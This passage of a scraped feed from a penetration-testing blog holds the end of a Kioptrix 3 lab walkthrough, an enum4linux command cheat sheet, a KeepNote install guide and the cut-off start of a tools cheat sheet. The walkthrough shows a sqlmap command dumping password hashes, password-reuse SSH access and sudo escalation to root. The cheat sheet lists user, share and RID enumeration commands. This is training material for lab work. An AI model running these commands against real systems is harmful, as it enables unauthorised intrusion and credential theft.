id=\"author-description\">Author Description</h2> \n<p>The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p> \n<h2 id=\"service-enumeration\">Service Enumeration</h2> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 4.7p1 Debian 8ubuntu1.3 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"web-application-investigation\">Web Application Investigation</h2> \n<p>Enumeration of the website discovered it was likely vulnerable to an SQL Injection, entering <code>id='</code> rendered the following MySQL error:</p> \n<p><img src=\"https://highon.coffee/img/blog/kioptrix/sql-error.png\" alt=\"SQL Error\" /></p> \n<p>SQLMap was used to successfully dump the databases and crack the hashes:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# sqlmap <span class=\"nt\">-u</span> <span class=\"s2\">\"http://kioptrix3.com/gallery/gallery.php?id=1\"</span> <span class=\"nt\">-p</span> <span class=\"nb\">id</span> <span class=\"nt\">-T</span> dev_accounts <span class=\"nt\">--dump</span>\n\nDatabase: gallery\nTable: dev_accounts\n<span class=\"o\">[</span>2 entries]\n+----+------------+---------------------------------------------+\n| <span class=\"nb\">id</span> | username   | password                                    |\n+----+------------+---------------------------------------------+\n| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 <span class=\"o\">(</span>Mast3r<span class=\"o\">)</span>   |\n| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e <span class=\"o\">(</span>starwars<span class=\"o\">)</span> |\n+----+------------+---------------------------------------------+</code></pre> \n</figure> \n<h2 id=\"non-privileged-shell\">Non privileged shell</h2> \n<p>Due to password reuse both accounts were able to ssh, dreg had a limited shell.</p> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>Local enumeration of loneferrets home dir disclosed:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">loneferret@Kioptrix3:~<span class=\"nv\">$ </span><span class=\"nb\">cat </span>CompanyPolicy.README\nHello new employee,\nIt is company policy here to use our newly installed software <span class=\"k\">for </span>editing, creating and viewing files.\nPlease use the <span class=\"nb\">command</span> <span class=\"s1\">'sudo ht'</span><span class=\"nb\">.</span>\nFailure to <span class=\"k\">do </span>so will result <span class=\"k\">in </span>you immediate termination.\n\nDG\nCEO</code></pre> \n</figure> \n<h2 id=\"privilege-escalation\">Privilege Escalation</h2> \n<p><code>sudo ht</code> rendered a file explorer, the user <code>loneferret</code> was added to the sudoers group, making privilege escalation trivial.</p> \n<p><img src=\"https://highon.coffee/img/blog/kioptrix/sudo-ht.png\" alt=\"sudo ht\" /></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">loneferret@Kioptrix3:~<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\nroot@Kioptrix3:~# <span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span>\nroot@Kioptrix3:~#</code></pre> \n</figure>","descriptionType":"text/html","publishedDate":"Fri, 20 Dec 2013 14:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/kioptrix/sql-error.png","linkMd5":"1168bf4a4520d86f8b57e5853adcfac1","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn100@2020_6/2020/08/25/01-24-54-464_64d8d55f47a84310.webp","destWidth":821,"destHeight":266,"sourceBytes":14763,"destBytes":11852,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/kioptrix/sql-error.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn100@2020_6/2020/08/25/01-24-54-464_64d8d55f47a84310.webp","https://highon.coffee/img/blog/kioptrix/sudo-ht.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn52@2020_2/2020/08/25/01-25-15-786_aacf4ddd942ab99c.webp"},"publishedOrCreatedDate":1598318675558},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"enum4linux Cheat Sheet","link":"https://highon.coffee/blog/enum4linux-cheat-sheet/","description":"<p><strong><a href=\"https://labs.portcullis.co.uk/tools/enum4linux/\">enum4linux</a></strong> is an alternative to enum.exe on Windows, enum4linux is used to enumerate Windows and Samba hosts.</p> \n<p><strong>enum4linux in a nutshell</strong></p> \n<ul> \n <li>RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)</li> \n <li>User listing (When RestrictAnonymous is set to 0 on Windows 2000)</li> \n <li>Listing of group membership information</li> \n <li>Share enumeration</li> \n <li>Detecting if host is in a workgroup or a domain</li> \n <li>Identifying the remote operating system</li> \n <li>Password policy retrieval (using polenum)</li> \n</ul> \n<h3 id=\"enum4linux-cheat-sheet\">enum4linux Cheat Sheet</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>enum4linux -v target-ip</code></p> </td> \n    <td> <p>Verbose mode, shows the underlying commands being executed by enum4linux</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -a target-ip</code></p> </td> \n    <td> <p>Do Everything, runs all options apart from dictionary based share name guessing</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -U target-ip</code></p> </td> \n    <td> <p>Lists usernames, if the server allows it - (RestrictAnonymous = 0)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -u administrator <br />-p password -U target-ip</code></p> </td> \n    <td> <p>If you've managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -r target-ip</code></p> </td> \n    <td> <p>Pulls usernames from the default RID range (500-550,1000-1050)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -R 600-660 target-ip</code></p> </td> \n    <td> <p>Pull usernames using a custom RID range</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -G target-ip</code></p> </td> \n    <td> <p>Lists groups. if the server allows it, you can also specify username <code>-u</code> and password <code>-p</code></p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -S target-ip</code></p> </td> \n    <td> <p>List Windows shares, again you can also specify username <code>-u</code> and password <code>-p</code></p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -s shares.txt target-ip</code></p> </td> \n    <td> <p>Perform a dictionary attack, if the server doesn't let you retrieve a share list </p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>enum4linux -o target-ip</code></p> </td> \n    <td> <p>Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows</p> </td> \n   </tr> \n   <td> <p><code>enum4linux -i target-ip</code></p> </td> \n   <td> <p>Pull information about printers known to the remove device.</p> </td> \n  </tbody> \n </table> \n</div>","descriptionType":"text/html","publishedDate":"Sun, 29 Mar 2015 00:58:10 +0000","feedId":11390,"bgimg":"","linkMd5":"34424f183a17941d6c544f2c058b6eb9","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675551},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"HowTo Install KeepNote on OSX Mavericks","link":"https://highon.coffee/blog/keepnote-macbook-install-instructions/","description":"<p><strong>KeepNote</strong> is my favorite tool for note keeping during penetration tests, it’s advertised as cross platform and works great on Linux and Windows. But getting it to work on <strong>OSX</strong> takes a bit of work, if you are prepared to jump through some hoops I’ve documented the installation process below.</p> \n<p>##Install Homebrew</p> \n<p><a href=\"http://brew.sh\">Homebrew</a> is a package manager for OSX, it allows you to install applications in a similar way to BSD ports.</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">ruby <span class=\"nt\">-e</span> <span class=\"s2\">\"</span><span class=\"si\">$(</span>curl <span class=\"nt\">-fsSL</span> https://raw.github.com/Homebrew/homebrew/go/install<span class=\"si\">)</span><span class=\"s2\">\"</span></code></pre>\n</figure> \n<p>After running the Brew command the following <strong>Apple Developer Tools</strong> box will appears, click install (you no longer have to install Xcode).</p> \n<p><img src=\"https://i.imgur.com/a2hVkK5.png\" alt=\"Install Apple Developer Tools OSX Mavericks\" title=\"Install Apple Developer Tools OSX Mavericks\" /></p> \n<p>Output:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">ruby <span class=\"nt\">-e</span> <span class=\"s2\">\"</span><span class=\"si\">$(</span>curl <span class=\"nt\">-fsSL</span> https://raw.github.com/Homebrew/homebrew/go/install<span class=\"si\">)</span><span class=\"s2\">\"</span>\n<span class=\"o\">==&gt;</span> This script will <span class=\"nb\">install</span>:\n/usr/local/bin/brew\n/usr/local/Library/...\n/usr/local/share/man/man1/brew.1\n\nPress RETURN to <span class=\"k\">continue </span>or any other key to abort\n<span class=\"o\">==&gt;</span> /usr/bin/sudo /bin/mkdir /usr/local\n\nWARNING: Improper use of the <span class=\"nb\">sudo command </span>could lead to data loss\nor the deletion of important system files. Please double-check your\ntyping when using sudo. Type <span class=\"s2\">\"man sudo\"</span> <span class=\"k\">for </span>more information.\n\nTo proceed, enter your password, or <span class=\"nb\">type </span>Ctrl-C to abort.\n\nPassword:\n<span class=\"o\">==&gt;</span> /usr/bin/sudo /bin/chmod g+rwx /usr/local\n<span class=\"o\">==&gt;</span> /usr/bin/sudo /usr/bin/chgrp admin /usr/local\n<span class=\"o\">==&gt;</span> /usr/bin/sudo /bin/mkdir /Library/Caches/Homebrew\n<span class=\"o\">==&gt;</span> /usr/bin/sudo /bin/chmod g+rwx /Library/Caches/Homebrew\n<span class=\"o\">==&gt;</span> Installing the Command Line Tools <span class=\"o\">(</span>expect a GUI popup<span class=\"o\">)</span>:\n<span class=\"o\">==&gt;</span> /usr/bin/sudo /usr/bin/xcode-select <span class=\"nt\">--install</span>\nxcode-select: note: <span class=\"nb\">install </span>requested <span class=\"k\">for </span><span class=\"nb\">command </span>line developer tools\nPress any key when the installation has completed.\n<span class=\"o\">==&gt;</span> Downloading and installing Homebrew...\nremote: Counting objects: 191438, <span class=\"k\">done</span><span class=\"nb\">.</span>\nremote: Compressing objects: 100% <span class=\"o\">(</span>52107/52107<span class=\"o\">)</span>, <span class=\"k\">done</span><span class=\"nb\">.</span>\nremote: Total 191438 <span class=\"o\">(</span>delta 138158<span class=\"o\">)</span>, reused 191438 <span class=\"o\">(</span>delta 138158<span class=\"o\">)</span>\nReceiving objects: 100% <span class=\"o\">(</span>191438/191438<span class=\"o\">)</span>, 38.69 MiB | 4.99 MiB/s, <span class=\"k\">done</span><span class=\"nb\">.</span>\nResolving deltas: 100% <span class=\"o\">(</span>138158/138158<span class=\"o\">)</span>, <span class=\"k\">done</span><span class=\"nb\">.</span>\nFrom https://github.com/Homebrew/homebrew\n <span class=\"k\">*</span> <span class=\"o\">[</span>new branch]      master     -&gt; origin/master\nHEAD is now at cc18ca2 rabbitmq-c: general cleanup.\n<span class=\"o\">==&gt;</span> Installation successful!\n<span class=\"o\">==&gt;</span> Next steps\nRun <span class=\"sb\">`</span>brew doctor<span class=\"sb\">`</span> before you <span class=\"nb\">install </span>anything\nRun <span class=\"sb\">`</span>brew <span class=\"nb\">help</span><span class=\"sb\">`</span> to get started</code></pre>\n</figure> \n<p>Run brew doctor to confirm the Brew install is working.</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">brew doctor\nYour system is ready to brew.</code></pre>\n</figure> \n<p>Settle the dependencies for KeepNote using Homebrew:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">brew <span class=\"nb\">install </span>python aspell sqlite3</code></pre>\n</figure> \n<p>Use Brew to create Python links:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">brew linkapps</code></pre>\n</figure> \n<p>Download:</p> \n<p><a href=\"http://sourceforge.net/projects/macpkg/files/PyGTK/2.24.0/PyGTK.pkg/download\">PyGTK</a></p> \n<p><a href=\"http://xquartz.macosforge.org/landing/\">Xquartz</a></p> \n<h2 id=\"install-pygtk--xquartz\">Install pyGTK &amp; Xquartz</h2> \n<p>Install pyGTK, double click the download run through the options, you’ll be prompted for your password.</p> \n<p><img src=\"https://i.imgur.com/g0cQ4Sh.png\" alt=\"PyGTK GTK+ Python OSX Install\" title=\"PyGTK GTK+ Python OSX Install\" /></p> \n<p>Then do the same for Xquartz and reboot.</p> \n<p><img src=\"https://i.imgur.com/77iRaHQ.png\" alt=\"Quartz Install\" title=\"XQuartz Install\" /></p> \n<p><img src=\"https://i.imgur.com/Pnxz9Q0.png\" alt=\"XQuartz Mac\" title=\"XQuartx Mac\" /></p> \n<p>Download and extract the latest KeepNote somewhere sensible, like /usr/local/share/ and cd into the bin dir and execute ./keepnote - KeepNote will then open, my install complained about some missing fonts in the terminal when launching.</p> \n<p><img src=\"https://i.imgur.com/ADcoDNl.png\" alt=\"KeepNote Mac OSX Install\" title=\"KeepNote Mac OSX Install\" /></p> \n<p>I’ve chosen not to worry about the missing fonts.</p>","descriptionType":"text/html","publishedDate":"Sat, 09 Aug 2014 00:52:10 +0000","feedId":11390,"bgimg":"https://i.imgur.com/a2hVkK5.png","linkMd5":"d45baad8f3eb7662c98b0eef218c6dba","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn16@2020_6/2020/08/25/01-24-54-403_1f67c6f6a8cb65db.webp","destWidth":575,"destHeight":307,"sourceBytes":59177,"destBytes":39136,"author":"Arr0way","articleImgCdnMap":{"https://i.imgur.com/a2hVkK5.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn16@2020_6/2020/08/25/01-24-54-403_1f67c6f6a8cb65db.webp","https://i.imgur.com/g0cQ4Sh.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn96@2020_4/2020/08/25/01-25-15-941_ad6e852eed68f067.webp","https://i.imgur.com/77iRaHQ.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn27@2020_1/2020/08/25/01-25-16-698_462044bd67c893da.webp","https://i.imgur.com/Pnxz9Q0.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn92@2020_2/2020/08/25/01-25-14-457_18bb652e45b47154.webp","https://i.imgur.com/ADcoDNl.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn63@2020_6/2020/08/25/01-25-15-930_dc7acc49afcd284c.webp"},"publishedOrCreatedDate":1598318675555},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Penetration Testing Tools Cheat Sheet","link":"https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/","description":"<h2 id=\"introduction\">Introduction</h2> \n<p><strong>Penetration testing tools cheat sheet</strong>, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level overview of the <strong>typical</strong> commands <a href=\"https://www.aptive.co.uk/penetration-testing/\">a third-party pen test company</a> would run when performing a manual infrastructure penetration test. For more in depth information I’d recommend the man file for the tool or a more specific pen testing cheat sheet from the menu on the right.</p> \n<p>The focus of this cheat sheet is infrastructure / network penetration testing, web application penetration testing is not covered here apart from a few sqlmap commands at the end and some web server enumeration. For Web Application Penetration Testing, check out the Web Application Hackers Hand Book, it is excellent for both learning and reference.</p> \n<p>If I’m missing any pen testing tools here give me a nudge on twitter.</p> \n<h3 id=\"changelog\">Changelog</h3> \n<p>17/02/2017 - Article updated, added loads more content, VPN, DNS tunneling, VLAN hopping etc - check out the TOC below.</p> \n<ul
